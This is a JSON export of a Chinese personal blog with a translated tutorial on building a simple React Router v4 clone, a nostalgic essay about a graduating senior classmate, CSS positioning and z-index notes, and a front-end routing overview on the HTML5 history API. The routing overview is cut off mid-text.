[{"title":"【转】Build your own React Router v4","date":"2018-01-11T01:48:37.316Z","path":"2018/01/11/【转】打造属于你自己的React Router v4/","text":"【转】Build your own React Router v4 作者：Tyler 编译：胡子大哈 翻译原文：http://huziketang.com/blog/posts/detail?postId=58d36df87413fc2e82408555 英文原文：https://tylermcginnis.com/build-your-own-react-router-v4/ 转载请注明出处，保留原文链接以及作者信息 我还记得我第一次学习开发客户端应用路由时的感觉，那时候我还是一个涉足在“单页面应用”的未出世的小伙子，那会儿，要是说它没把我的脑子弄的跟屎似的，那我是在撒谎。一开始的时候，我的感觉是我的应用程序代码和路由代码是两个独立且不同的体系，就像是两个同父异母的兄弟，互相不喜欢但是又不得不在一起。 经过了一些年的努力，我终于有幸能够教其他开发者关于路由的一些问题了。我发现，好像很多人对于这个问题的思考方式都和我当时很类似。我觉得有几个原因。首先，路由问题确实很复杂，对于那些路由库的开发者而言，找到一个合适的路由抽象概念来解释这个问题就更加复杂。第二，正是由于路由的复杂性，这些路由库的使用者倾向于只使用库就好了，而不去弄懂到底背后是什么原理。 本文中，我们会深入地来阐述这两个问题。我们会通过创建一个简单版本的 React Router v4 来解决第二个问题，而通过这个过程来阐释第一个问题。也就是说通过我们自己构建 RRv4 来解释 RRv4 是否是一个合适的路由抽象。 下面是将要用来测试我们所构建的 React Router 的代码。最终的代码实例你可以在这里得到。 &#123;.line-numbers&#125;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253const Home = () =&gt; ( &lt;h2&gt;Home&lt;/h2&gt;)const About = () =&gt; ( &lt;h2&gt;About&lt;/h2&gt;)const Topic = (&#123; topicId &#125;) =&gt; ( &lt;h3&gt;&#123;topicId&#125;&lt;/h3&gt;)const Topics = (&#123; match &#125;) =&gt; &#123; const items = [ &#123; name: 'Rendering with React', slug: 'rendering' &#125;, &#123; name: 'Components', slug: 'components' &#125;, &#123; name: 'Props v. State', slug: 'props-v-state' &#125;, ] return ( &lt;div&gt; &lt;h2&gt;Topics&lt;/h2&gt; &lt;ul&gt; &#123;items.map((&#123; name, slug &#125;) =&gt; ( &lt;li key=&#123;name&#125;&gt; &lt;Link to=&#123;`$&#123;match.url&#125;/$&#123;slug&#125;`&#125;&gt;&#123;name&#125;&lt;/Link&gt; &lt;/li&gt; ))&#125; &lt;/ul&gt; &#123;items.map((&#123; name, slug &#125;) =&gt; ( &lt;Route key=&#123;name&#125; path=&#123;`$&#123;match.path&#125;/$&#123;slug&#125;`&#125; render=&#123;() =&gt; ( &lt;Topic topicId=&#123;name&#125; /&gt; )&#125; /&gt; ))&#125; &lt;Route exact path=&#123;match.url&#125; render=&#123;() =&gt; ( &lt;h3&gt;Please select a topic.&lt;/h3&gt; )&#125;/&gt; &lt;/div&gt; )&#125;const App = () =&gt; ( &lt;div&gt; &lt;ul&gt; &lt;li&gt;&lt;Link to=\"/\"&gt;Home&lt;/Link&gt;&lt;/li&gt; &lt;li&gt;&lt;Link to=\"/about\"&gt;About&lt;/Link&gt;&lt;/li&gt; &lt;li&gt;&lt;Link to=\"/topics\"&gt;Topics&lt;/Link&gt;&lt;/li&gt; &lt;/ul&gt; &lt;hr/&gt; &lt;Route exact path=\"/\" component=&#123;Home&#125;/&gt; &lt;Route path=\"/about\" component=&#123;About&#125;/&gt; &lt;Route path=\"/topics\" component=&#123;Topics&#125; /&gt; &lt;/div&gt;) 如果你还不熟悉 React Router v4，就先了解几个基本问题。Route 用来渲染 UI，当一个 URL 匹配上了你所指定的路由路径，就进行渲染。Link 提供了一个可以浏览访问你 app 的方法。换句话讲，Link 组件允许你更新你的 URL，而 Route 组件根据你所提供的新 URL 来改变 UI。 本文并不会手把手的教你 RRV4 的基础，所以如果上面的代码你看起来很费劲的话，可以先来这里看一下官方文档。把玩一下里面的例子，当你觉得顺手了的时候，欢迎回来继续阅读。 如上段所说，路由给我们提供了两个组件可以用于你的 app：Link 和 Route。我喜欢 React Router v4 的原因是它的 API “只是组件”而已，可以理解成没有引入其他概念。这就是说如果你对 React 很熟悉的话，那么你对组件以及怎么组合组件一定有自己的理解，而这对于你写路由代码依然适用。这就很方便了，因为已经熟悉了如何创造组件，那么创建你自己的 React Router 就只是做你已经熟悉的事情——创建组件。 worldzhao:自己从无到有搭建一个前端路由库很麻烦（比如根据url切换视图），但是依赖于React,我们可以很轻松的做到，就是render函数嘛，所以react router v4的组件和我们平时编写的组件除了功能之外并无其他区别，这便是’Just Components’的魅力了吧。 Route现在就来一起创建我们的 Route 组件。在上面的例子中，可以注意到 &lt;Route&gt; 使用了三个属性：exact、path 和 component。他们的属性类型（propTypes）对于 Route 组件来是这样的： 12345static propTypes = &#123; exact: PropTypes.bool, path: PropTypes.string, component: PropTypes.func,&#125; 这里有些小细节。首先，path 并不需要，因为如果路由中没有给 path 那么将会自动渲染。第二，component 也不需要，是因为如果路径匹配上了，有很多不同的方法来告诉 React Router 要渲染什么 UI。其中一个上面没有提到的方法就是使用 render 来通知 React Router，具体代码像这样： 123&lt;Route path='/settings' render=&#123;(&#123; match &#125;) =&gt; &#123; return &lt;Settings authed=&#123;isAuthed&#125; match=&#123;match&#125; /&gt;&#125;&#125; /&gt; render 允许你创建一个直接返回 UI 的内联函数而不用创建额外的组件，所以我们也可以把它添加到 proTypes 中： 123456static propTypes = &#123; exact: PropTypes.bool, path: PropTypes.string, component: PropTypes.func, render: PropTypes.func,&#125; 现在我们知道了 Route 接收的属性，我们来了解一下它们的具体功能。还记得上面说的：“当 URL 匹配上了你所指定的路由 path 以后，Route 渲染其对应的 UI”。基于这样的定义，可以知道，&lt;Route&gt; 需要一些功能性函数，来判断当前的 URL 是否匹配上了组件的 path 属性。如果匹配上了，那么返回渲染的 UI；如果没有那么什么都不做并且返回 null。 一起来看一下这个匹配函数应该怎么写，暂且把它叫做 matchPath 吧。 1234567891011121314151617181920212223242526class Route extends Component &#123; static propTypes = &#123; exact: PropTypes.bool, path: PropTypes.string, component: PropTypes.func, render: PropTypes.func, &#125;; render() &#123; const &#123;path, exact, component, render&#125; = this.props; const match = matchPath(window.location.pathname, &#123;path, exact&#125;); if (!match) &#123; // 如果没有匹配到，就什么都不渲染 return null; &#125; // 如果匹配到了 并且 component 存在 if (component) &#123; // 以 component 创建新元素并且通过 match 传递 return React.createElement(component, &#123;match&#125;); &#125; // 如果匹配到了 但是没有 component ， 有 render 方法 if (render) &#123; return render(&#123;match&#125;); &#125; return null; &#125;&#125; 上面的代码即实现了：如果匹配上了 path 属性，就返回 UI，否则什么也不做。 我们再来谈一下路由的问题。在客户端应用这边，一般来讲只有两种方式更新 URL。 一种是用户点击 a 标签。 一种是点击后退/前进按钮。 基本上我们的路由只要关心 URL 的变化并且返回相应的 UI 即可。 worldzhao: 就是我们的Route组件要根据url的变化来update，监听url变化重新渲染Route组件(forceupdate). 假设我们知道更新 URL 的方式只有上面两种，那么就可以针对这两种情况做特殊处理了。稍后在构建 组件的时候再详细介绍 a 标签的情况，这里先讨论后退/前进按钮。 React Router 使用了 History工程里的 .listen 方法来监听当前 URL 的变化，为了避免再引入其他的库，我们使用 HTML5 的 popstate 事件来实现这一功能。 当用户点击了后退/前进按钮，popstate 就被触发，我们需要的就是这个功能。 因为 Route 渲染 UI 是根据当前 URL来做的，因此给 Route 配上监听能力也是合理的，在 popstate 触发的地方重新渲染 UI。就是说在触发 popstate 时检查是否匹配上了新的 URL，如果是则渲染 UI，如果不是，什么也不做，下面看一下代码。 1234567891011121314151617181920212223242526272829303132333435class Route extends Component &#123; static propTypes: &#123; path: PropTypes.string, exact: PropTypes.bool, component: PropTypes.func, render: PropTypes.func, &#125; componentWillMount() &#123; // 监听前进后退事件 addEventListener(\"popstate\", this.handlePop) &#125; componentWillUnmount() &#123; removeEventListener(\"popstate\", this.handlePop) &#125; handlePop = () =&gt; &#123; // 重新刷新 this.forceUpdate() &#125; render() &#123; const &#123; path, exact, component, render, &#125; = this.props const match = matchPath(location.pathname, &#123; path, exact &#125;) if (!match) return null if (component) return React.createElement(component, &#123; match &#125;) if (render) return render(&#123; match &#125;) return null &#125;&#125; 这里要注意的是我们只是加了一个 popstate 监听，当 popstate 触发的时候，调用 forceUpdate 来强制做重新渲染的判断。 这样就实现了所有的 &lt;Route&gt; 都会监听，根据后退/前进按钮来“重匹配”、“重判断”和“重渲染”。 到现在，我们一直还没有实现的是 matchPath 函数。这个函数在我们的 router 中是特别关键的，因为它是判断当前 URL 是否匹配上了 组件的关键点。matchPath 值得注意的一点是一定要把 的 exact 考虑清楚。如果你对 exact 还不了解，看下下面这句话，给出了规范文档中的解释： 只有当所给路径精确匹配上 location.pathname 时才返回 true。 接下来就来具体实现 matchPath 函数。如果你回头看一下上面 Route 组件的代码，你可以看到 matchPath 函数是这样的： 1const match = matchPath(window.location.pathname, &#123;path, exact&#125;); 这里的match要么是对象，要么是null，这得取决于是否匹配上path。根据这个声明，我们来写matchPath代码： 123const matchPath = (pathname, options) =&gt; &#123; const &#123;exact = false, path&#125; = options;&#125; 这里使用 ES6 语法。上面的意思是，创建一个叫做 exact 的变量，使其等于 options.exact，并且如果非 null 的话则设置其为 false。同样创建一个叫做 path 的变量，使其等于 options.path。 接下来就添加判断是否匹配。React Router 使用 pathToRegex 来实现，只需要写简单的正则匹配就可以了。 1234567891011const matchPath = (pathname, options) =&gt; &#123; const &#123;exact = false, path&#125; = options; if (!path) &#123; return &#123; path: null, url: pathname, isExact: true, &#125; &#125; const match = new RegExp(`^$&#123;path&#125;`).exec(pathname);&#125; 如果匹配上了，那么返回一个包含有所有匹配串的数组，否则返回 null。 下面是我们示例 app 的路由 ‘/topics/components’ 的一些匹配项。 注意：每个 &lt;Route&gt; 都在自己的渲染方法里调用 matchPath，所以要为每个 &lt;Route&gt; 配一个 match。 现在我们要做的是添加判断是否有匹配的代码： 123456789101112131415161718192021222324252627const matchPath = (pathname, options) =&gt; &#123; const &#123;exact = false, path&#125; = options; if (!path) &#123; return &#123; path: null, url: pathname, isExact: true, &#125; &#125; const match = new RegExp(`^$&#123;path&#125;`).exec(pathname); if (!match) &#123; // 没有匹配上 return null; &#125; const url = match[0]; const isExact = pathname === url; if (exact &amp;&amp; !isExact) &#123; // 要求精确匹配（exact为真） 却不是精确匹配(isExact为假) return null; &#125; return &#123; // 不要求精确匹配(exact === false) 或是精确匹配成功(exact === isExact === true) path, url, isExact &#125;&#125;; Link之前有讲过的，对于用户来讲，有两种方式更新 URL：通过后退/前进按钮和通过点击 a 标签。对于后退/前进点击来说，使用 popstate 事件给 Route 添加监听就可以，现在来看一下如何通过 Link 解决 a 标签问题。 Link 的 API 如下： 1&lt;Link to='/some-path' replace=&#123;false&#125; /&gt; 这里 to 是一个 string 类型，指的是要链接到的地址。replace 是一个布尔值，如果是 true，那么点击链接将替换当前的实体到历史堆栈，而不是添加一个新的进去。 添加这些 propTypes 到 Link 组件就得到： 123456class Link extends Component &#123; static propTypes = &#123; to: PropTypes.string.isRequired, replace: PropTypes.bool, &#125;&#125; 我们知道在 Link 组件中的渲染函数需要返回一个 a 标签，但是我们不想每次变路由都进行一次全页面刷新，所以通过增加一个 onClick 处理程序来劫持 a 标签。 1234567891011121314151617181920class Link extends Component &#123; static propTypes = &#123; to: PropTypes.string.isRequired, replace: PropTypes.bool, &#125; handleClick = (event) =&gt; &#123; const &#123; replace, to &#125; = this.props event.preventDefault() // 这里是路由,仅仅改变url（不会刷新页面） &#125; render() &#123; const &#123; to, children&#125; = this.props return ( &lt;a href=&#123;to&#125; onClick=&#123;this.handleClick&#125;&gt; &#123;children&#125; &lt;/a&gt; ) &#125;&#125; ok，代码写到现在，就差更改当前 URL 了。在 React Router 是使用 History 工程里面的 push 和 replace 方法。为了避免增加新依赖，这里我使用 HTML5 的 pushState 和 replaceState。 本文中我们为了防止引入额外的依赖，一直也没采用 History 库。但是它对真实的 React Router 却是至关重要的，因为它对不同的 session 管理和不同的浏览器环境进行了规范化处理。 pushState 和 replaceState 都接收三个参数。第一个参数是一个与历史实体相关联的对象，我们不需要，所以设置成一个空对象。第二个参数是标题，我们也不需要，所以也设置成空。第三个是我们需要使用的，指的是：相关 URL。 123456const historyPush = (path) =&gt; &#123; history.pushState(&#123;&#125;, null, path)&#125;const historyReplace = (path) =&gt; &#123; history.replaceState(&#123;&#125;, null, path)&#125; 在 Link 组件内部，会调用 historyPush 或者 historyReplace，依赖于前面提到的 replace 属性。 12345678910111213141516171819class Link extends Component &#123; static propTypes = &#123; to: PropTypes.string.isRequired, replace: PropTypes.bool, &#125; handleClick = (event) =&gt; &#123; const &#123; replace, to &#125; = this.props event.preventDefault() replace ? historyReplace(to) : historyPush(to) &#125; render() &#123; const &#123; to, children&#125; = this.props return ( &lt;a href=&#123;to&#125; onClick=&#123;this.handleClick&#125;&gt; &#123;children&#125; &lt;/a&gt; ) &#125;&#125; Link -&gt; Url -&gt; Route现在就只剩下最后一件很关键的问题了，如果你想把上面的例子用在自己的路由代码里面，你需要注意这个问题。 当你浏览时，URL 会发生改变，但是 UI 却没有刷新，这是为什么呢？ 这是因为，尽管你通过 historyReplace 或者 historyPush 改变了地址，但是 &lt;Route&gt; 并没有意识到已经改变了，也不知道应该重匹配和重渲染。为了解决这个问题，需要跟踪每一条 &lt;Route&gt; 并且当路由发生改变的时候调用 forceUpdate。 React Router 通过设置状态、上下文和历史信息的组合来解决这个问题。监听路由组件的内部代码。 为了使路由简单，我们通过把所有路由对象放到一个数组里的方式来实现 &lt;Route&gt; 跟踪。每当发生地址改变的时候，就遍历一遍数组，调用相应对象的 forceUpdate 函数。 123let instances = []const register = (comp) =&gt; instances.push(comp)const unregister = (comp) =&gt; instances.splice(instances.indexOf(comp), 1) 注意这里创建了两个函数。当 &lt;Route&gt; “装配”上，就调用 register；当“解装配”，就调用 unregister。然后只要调用 historyPush 或者 historyReplace（实际上用户每次点击 都会调用），就遍历对象数组，并调用 forceUpdate。 首先更新 &lt;Route&gt; 组件： 123456789101112131415161718class Route extends Component &#123; static propTypes: &#123; path: PropTypes.string, exact: PropTypes.bool, component: PropTypes.func, render: PropTypes.func, &#125; componentWillMount() &#123; addEventListener(\"popstate\", this.handlePop) // 丢进公共数组instance中 register(this) &#125; componentWillUnmount() &#123; unregister(this) removeEventListener(\"popstate\", this.handlePop) &#125;...&#125; 再更新 historyPush 和 historyReplace： 123456789const historyPush = (path) =&gt; &#123; history.pushState(&#123;&#125;, null, path) // url变化后 遍历所有Route，刷新 instances.forEach(instance =&gt; instance.forceUpdate())&#125;const historyReplace = (path) =&gt; &#123; history.replaceState(&#123;&#125;, null, path) instances.forEach(instance =&gt; instance.forceUpdate())&#125; 这时只要 &lt;Link&gt; 被点击并且地址发生变化，每个 &lt;Route&gt; 都会接收到消息，并且进行重匹配和重渲染。 这就完成了所有的路由代码了，并且实例 app 用这些代码可以完美运行！ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110import React, &#123;Component&#125; from 'react';import PropTypes from 'prop-types';let instances = [];const register = (comp) =&gt; instances.push(comp);const unregister = (comp) =&gt; instances.splice(instances.indexOf(comp), 1);// Routeconst matchPath = (pathname, options) =&gt; &#123; const &#123;exact = false, path&#125; = options; if (!path) &#123; return &#123; path: null, url: pathname, isExact: true, &#125; &#125; const match = new RegExp(`^$&#123;path&#125;`).exec(pathname); if (!match) &#123; // 没有匹配上 return null; &#125; const url = match[0]; const isExact = pathname === url; if (exact &amp;&amp; !isExact) &#123; // 要求精确匹配（exact为真） 却不是精确匹配(isExact为假) return null; &#125; return &#123; // 不要求精确匹配(exact === false) 或是精确匹配成功(exact === isExact === true) path, url, isExact &#125;&#125;;export class Route extends Component &#123; static propTypes = &#123; exact: PropTypes.bool, path: PropTypes.string, component: PropTypes.func, render: PropTypes.func, &#125;; componentWillMount() &#123; // 监听前进后退事件 window.addEventListener(\"popstate\", this.handlePop) register(this); &#125; componentWillUnmount() &#123; window.removeEventListener(\"popstate\", this.handlePop) unregister(this); &#125; handlePop = () =&gt; &#123; this.forceUpdate() &#125;; render() &#123; const &#123;path, exact, component, render&#125; = this.props; const match = matchPath(window.location.pathname, &#123;path, exact&#125;); if (!match) &#123; // 如果没有匹配到，就什么都不渲染 return null; &#125; // 如果匹配到了 并且 component 存在 if (component) &#123; // 以 component 创建新元素并且通过 match 传递 return React.createElement(component, &#123;match&#125;); &#125; // 如果匹配到了 但是没有 component ， 有 render 方法 if (render) &#123; return render(&#123;match&#125;); &#125; return null; &#125;&#125;// Linkconst historyPush = (path) =&gt; &#123; window.history.pushState(&#123;&#125;, null, path); instances.forEach(instance =&gt; instance.forceUpdate());&#125;;const historyReplace = (path) =&gt; &#123; window.history.replaceState(&#123;&#125;, null, path); instances.forEach(instance =&gt; instance.forceUpdate());&#125;;export class Link extends Component &#123; static propTypes = &#123; to: PropTypes.string.isRequired, replace: PropTypes.bool, &#125;; handleClick = (event) =&gt; &#123; const &#123;replace, to&#125; = this.props; event.preventDefault(); // 这里是路由,仅仅改变url（不会刷新页面） replace ? historyReplace(to) : historyPush(to); &#125;; render() &#123; const &#123;to, children&#125; = this.props; return ( &lt;a href=&#123;to&#125; onClick=&#123;this.handleClick&#125;&gt; &#123;children&#125; &lt;/a&gt; ) &#125;&#125; 另外：React Router API 还自然派生出了 &lt;Redirect&gt; 组件。使用上面我们写的代码，这个组件可以直接写成： 12345678910111213141516class Redirect extends Component &#123; static defaultProps = &#123; push: false &#125; static propTypes = &#123; to: PropTypes.string.isRequired, push: PropTypes.bool.isRequired, &#125; componentDidMount() &#123; const &#123; to, push &#125; = this.props push ? historyPush(to) : historyReplace(to) &#125; render() &#123; return null &#125;&#125; 注意这个组件并不渲染任何 UI，它只用来做路由定向使用。 我希望这篇文章已经帮助你搭建出了一个React Router底层模型，并且能够体会到React Router的优雅以及‘仅仅是组件’的理念。我之前总是说React会使你成为一个更好的JavaScript开发者。我现在依旧相信React Router会是你成为一个更好的React开发者。因为一切皆组件，如果你会React，你就会React Router。 I hope this has helped you create a better mental model of what’s happening in React Router while also helping you to gain an appreciation for React Router’s elegance and “Just Components” API. I’ve always said that React will make you a better JavaScript developer. I now also believe that React Router will make you a better React developer. Because everything is just components, if you know React, you know React Router.","tags":[{"name":"React Router","slug":"React-Router","permalink":"http://yoursite.com/tags/React-Router/"}]},{"title":"遇雨","date":"2017-11-04T12:56:32.000Z","path":"2017/11/04/遇雨/","text":"去年助导靳昊毕业的时侯，写过一篇文章，以如今的心态去看，倒也是别有一番感受。自己的文笔并不好，或许在别人的口中能让那天的故事更有趣一点。 那天海口难得降温了，下了课，风很大，顶着风跑回来看见昊哥在我们宿舍打游戏，他宿舍停电了。 徐威和周路宇借了小电动去一食堂吃夜宵，我和昊哥决定去南门。 军绿色的背心，灰色夹克，下面是运动裤和运动鞋，我想起第一次见到昊哥，那是大一时的第一次班会，帽子T恤短裤运动鞋，花花的。 妖风肆虐，可能也是临近毕业，路灯枯黄的光落在他身上有一种很悲伤的感觉。 我大一的时候他刚大三，那时我才大二，他却在准备毕业了，我自己也很惶恐。外面校车在路上呼呼地跑，我沉默地看着他玩手机，我没带手机出门，失策。 这是我最亲的学长，我总说我把自己的学弟学妹当儿子女儿一样，但是我万万不会把他当爸爸，因为不会有价值观这么悬殊的父子，我们在一起，一般是我先教育他，满满的鸡汤和热血: 我们还年轻，世界属于我们。我挺直了背慢慢道，让风吹起我的衬衣下摆，清新，脱俗。然后鸡汤和热血撒了一地。他并不喜欢这样。每个人有自己的活法，我只想简简单单平平安安。你得有追求，你这样不行……我不是一个爱多管闲事的人，可能真的是价值观碰撞的时候就特别想说服对方，这只是一种自我满足，好为人师是一种病，谁也说不服了谁，毕竟谁都没有错。 当然我知道很多人对这种想法很不屑，一个大学毕业生，年纪轻轻朝气蓬勃，怎么能没有一点追求，简简单单，平平安安？这是街边一边抠脚一边嗑瓜子的大爷的台词嘛？ 我只能说，人各有志。 我们在街尾的一家小摊点了两碗牛杂，我是粉，他是面，你看，口味都不一样。 秋风，枯灯，牛杂面。 这种场景是一般是热泪盈眶地谈梦想的，但他快离开，我想出路可能并没有那么容易找，只能打个哈哈。 他对我说了很多，比如找实习啊，好好学英语啊，用心钻研一门技能啊，最好有海外交流的经验等等，这些话让我觉得他并不想活的简简单单。 你觉得你大学过得怎么样？不知道。不过有三件事想起来很不错，当教官，跳猴子舞还有参加了一个麻风康复存的志愿者工作。 我仿佛看到了一点光，不是那种枯黄的光，是海南的太阳，能够晒死你的那种。 我一直在想怎么样让自己的大学四年有意义，是不是让自己好好学习成为一名高级技工拿着厉害的不行的offer就行了？因为总是接触这种信息啊，哎呀那人大二就去哪儿实习了，那人保研到哪儿了等等此类，给我们借来了这种梦想： 出人头地。 可是每个人都是这样的吗？ 他说有的同学从大一开始做志愿者，去麻风村照顾老人，做到大四，那里被隔离的老人把他们当成亲人，我去的不多，但是觉得很棒。 他说猴子舞他从13年末加入开始跳，跳到大三，拿了省奖，拿了国奖，这个月二十号去了那片保护区，还剩最后二十几只黑冠猿，还睡了次草屋，哈哈。 他说我当教官的时候我周围的人都不信，我不该和黄海宁说我是旅院的，不然我就带你们班了，啧啧。 他说那家烤地瓜怎么排队的人那么长，你要不要请我吃？ 滚。 风真的很大。 一般这种天气我一般会想到刘原的那段话：“浸在夜雨中，一阵阴风掠过，陌生的故乡就以这样的姿态侵入坚硬而冰冷的梦境：落叶飞旋，霜草委顿，一条瘦骨嶙峋的狗在巷口沉思。丧家犬。日暮乡关何处是，遍地流窜丧家犬。” 那天我的脑子里是下面这句： “今晚的月色真明亮啊，走夜路也不会迷路。” —————————我是两年后的分割线—————————— 向往着月亮，却还是要为买面包的六便士着急，这就是生活的常态吧。 如今再来看这篇文章，才发现助导所需要的“简简单单，平平安安”的生活难度之大。 难以想象，牛杂摊早已不见，而亲爱的靳昊助导，早已毕业两年了。 如今大四的我们，站在毕业的十字路口，为了考研着急、为了工作着急、为了男女朋友着急，从个人价值的实现需求直线降到生理温饱需求，不应该啊，高贵的马斯洛，可怜的我。当代人民都太浮躁了，网络高速发达的今天，把你我五年后、十年后的样子都有声有色地描绘了出来，看，以后你就是过着这种生活。 能够一眼望穿的生活，多无趣呀。 最后用金庸先生的一段话作结。 ＂两人去轩辕台路上遇雨，郭靖道：那么咱们快跑。黄蓉摇了摇头：靖哥哥，前面也下大雨，跑过去还不是一般的淋湿？郭靖笑道：正是。黄蓉心中却忽然想起了华筝之事：“前途既已注定了是忧患伤心，不论怎生走法，终究避不了、躲不开，便如长岭遇雨一般。当下两人便在大雨中缓缓行去。＂","tags":[{"name":"琐事","slug":"琐事","permalink":"http://yoursite.com/tags/琐事/"},{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/tags/随笔/"}]},{"title":"一定微不足道的css","date":"2017-10-22T15:39:32.000Z","path":"2017/10/22/一点微不足道的css/","text":"最近被CSS怼成傻逼，总结一下平时没有注意的点，持续更新。 问题1：一个没有设置宽度的div，它的宽度是多少？ 问题2：把问题1里面的div设置为float为left呢？ 问题3：float脱离了文档流吗？ 问题4：脱离了文档流文字为什么还会环绕呢？ 问题5：postion:absolute脱离了文档流吗？ 问题6：postion:absolute没有设置left与top，div位置在哪，宽度如何？ 问题7：与absolute搭配的往往有z-index这个属性。那么如果有一个父元素z-index为1000，子元素z-index为100，谁在上面？ 问题1：一个没有设置宽度的div，它的宽度是多少？回答一：div为块级元素，每个块级元素默认占一行,自动充满父级元素的内容区域。 W3C:div元素没有特定的含义。除此之外，由于它属于块级元素，浏览器会在其前后显示折行。 问题2：把问题1里面的div设置为float为left呢？回答二：设置了float:left后，如果没有设置宽度，宽度是被内容撑开的，如果设置了宽度就是该宽度。 W3C:如果浮动非替换元素，则要指定一个明确的宽度；否则，它们会尽可能地窄。注：替换元素是浏览器根据其标签的元素与属性来判断显示具体的内容，如input/img/select等等。 问题3：float脱离了文档流吗？问题4：脱离了文档流文字为什么还会环绕呢？回答三：脱离了文档流，但仍然保持着部分的流动性。回答四：同上。 MDN:float CSS属性指定一个元素应沿其容器的左侧或右侧放置，允许文本和内联元素环绕它。该元素从网页的正常流动中移除，尽管仍然保持部分的流动性（与绝对定位相反）。 问题5：postion:absolute脱离了文档流吗？回答五：脱离了文档流 MDN:绝对定位的元素不再存在于正常文档布局流程中.相反，它坐在它自己的层独立于一切。 问题6：postion:absolute没有设置left与top，div位置在哪，宽度如何？回答六：如果没有设置left,top又没有设置right，bottom，它跟static时的位置一样。也就是说，如果其前面还有一个div，他就在这个div后面，和static时一样，不会浮在上面，也不会在左上角（当然，如果前面没有元素就在左上角了）。 测试：123456789101112131415.wrapper&#123; width: 500px; height: 500px; background-color: grey; position: relative;&#125;.upper&#123; height:100px; background-color: yellow;&#125;.inner&#123; width:200px; height:200px; background-color: red;&#125; 1234&lt;div class=\"wrapper\"&gt; &lt;div class=\"upper\"&gt;&lt;/div&gt; &lt;div class=\"inner\"&gt;&lt;/div&gt; &lt;/div&gt; 结果如图： 我们再来给inner加上position: absolute; 12345.inner&#123; width:200px; height:200px; background-color: red;&#125; 结果如图： 可以看出，设置了postion:absolute后，inner并没有如我们预想的那样和left:0 top:0一般蹲到左上角，而是乖乖的呆在了upper后面，和之前static一样。 问题7：与absolute搭配的往往有z-index这个属性。那么如果有一个父元素z-index为1000，子元素z-index为100，谁在上面？回答七：子元素在上面。先看代码： 123&lt;div class=\"par\"&gt; &lt;div class=\"child\"&gt;&lt;/div&gt;&lt;/div&gt; 1234567891011121314.par&#123; position: absolute; width:300px; height:300px; z-index:1000; background-color: #000;&#125;.child&#123; position: absolute; width:150px; height:150px; z-index:500; background-color: #fff;&#125; 效果如下： 子元素在上面，即使父元素的z-index远远大于子元素的z-index 以下转自segmentfault 根据规范，z-index是应用到定位元素的，也就是position属性不为relative的元素，否则，设置z-index是没有意义的；z-index的作用有两点，一是设置在当前堆叠上下文(stacking context)中的层级；二是创建一个新的堆叠上下文；z-index并不是设置的值越高，就会越靠近用户，还和堆叠上下文有关系； 在同一个堆叠上下文中的元素，z-index越高越靠近用户； 在不同堆叠上下文中的元素，如果堆叠上下文一距离用户更近，那么它的所有子元素都在另一个堆叠上下文子元素的前面，也就是离用户更近，不同堆叠上下文中的子元素不可能发生交叉； 所以，z-index其实不是一个绝对值，而是一个相对值；","tags":[{"name":"css","slug":"css","permalink":"http://yoursite.com/tags/css/"}]},{"title":"前端路由总结","date":"2017-10-22T15:37:58.000Z","path":"2017/10/22/前端路由总结/","text":"本文总结自： Web开发中 前端路由 实现的几种方式和适用场景 HTML 5 History API的”前生今世” 从零学习 React 技术栈系列教程 最初接触前端路由是vue-router，当时仅仅觉得可以通过router-link改变页面，觉得很神奇呀，用多了就习惯了。 后面接触了node，通过express知晓了后端路由，这是我就开始疑问了：为什么使用那些前端框架的时候，前端url改变了视图，但是却没有向后台发送请求？ 首先我们需要一些前置知识。 路由/前端路由/后端路由？路由：通过不同的url地址展示不同的内容或者页面。 前面提到过，我最初接触到路由是通过express框架，我们先看一段代码：123app.post('/category/add', function (req, res, next) &#123; // do something&#125;) 如果你没有接触过node也没关系，因为真的不难理解。 定义了一个path(‘/categoty/add’)，当有人通过(即域名+path)，例如： http://www.example.com/category/add 发起post请求时，就会进入后台定义好的回调函数，进行逻辑处理，譬如取得post传递过来的实体数据，对数据库进行增删查改，然后返回一个渲染好的html页面或者是json数据等等。 后端路由（不考虑提供API服务返回数据），这一过程由服务器控制完成的，直接喷射一个html给前端，浏览器页面刷新。 那前端路由是什么呢？还是通过不同的url地址展示不同的内容或者页面，但是这一过程都是由前端完成的，我们的页面或视图（模块）是在前端编写好，通过url变化去切换而已。 为什么需要前端路由： 因为后台每次返回一个新页面都会进行全局刷新，而在单页面应用中，大部分页面结构不变，只改变部分内容的使用，我们可以通过前端路由改变页面内容，后台只需要通过ajax提供数据即可。 现在，我们来看看前端路由到底是如何实现的。 实现简易前端路由首先我们需要了解HTML5为我们提供的history API，准确的说是这里面的两个方法:history.pushState和history.replaceState history.pushState 带有三个参数：一个状态对象，一个标题（现在被忽略了），以及一个可选的URL地址。下面将对这三个参数进行细致的检查： 实例代码（来自Web开发中 前端路由 实现的几种方式和适用场景） 12345678910111213141516171819202122//假设当前网页URL为：http://tonylee.pwwindow.history.pushState(null, null, \"http://tonylee.pw?name=tonylee\");//url变化：http://tonylee.pw -&gt; http://tonylee.pw?name=tonyleewindow.history.pushState(null, null, \"http://tonylee.pw/name/tonylee\");//url变化：http://tonylee.pw -&gt; http://tonylee.pw/name/tonyleewindow.history.pushState(null, null, \"?name=tonylee\");//url变化：http://tonylee.pw -&gt; http://tonylee.pw?name=tonyleewindow.history.pushState(null, null, \"name=tonylee\");//url变化：http://tonylee.pw -&gt; http://tonylee.pw/name=tonyleewindow.history.pushState(null, null, \"/name/tonylee\");//url变化：http://tonylee.pw -&gt; http://tonylee.pw/name/tonyleewindow.history.pushState(null, null, \"name/tonylee\");//url变化：http://tonylee.pw -&gt; http://tonylee.pw/name/tonylee//错误的用法：window.history.pushState(null, null, \"http://www.tonylee.pw?name=tonylee\");//error: 由于跨域将产生错误 history.replaceStatepushState()和replaceState()参数一样。两个方法的主要区别就是：pushState()是在history栈中添加一个新的条目，replaceState()是替换当前的记录值。关于API的详细解释可以戳这里 我们需要知道的是，就是两个方法可以改变浏览器的url，但是不会重新加载页面，没错！！！这些 URL 不会直接传给服务器，而是会被浏览器消化处理掉. 这个就是我们需要的。 这样我们就可以通过这两个方法改变url了。 改变之后呢？切换视图呀！ 那我们就需要在这两个方法被调用的时候，触发一个方法去切换视图，好在HTML5也给我们提供了一个事件。 window.onpopstate浏览器本身会自带一个popstate事件，但是只有在我们点击返回或前进按钮时才会正常触发。 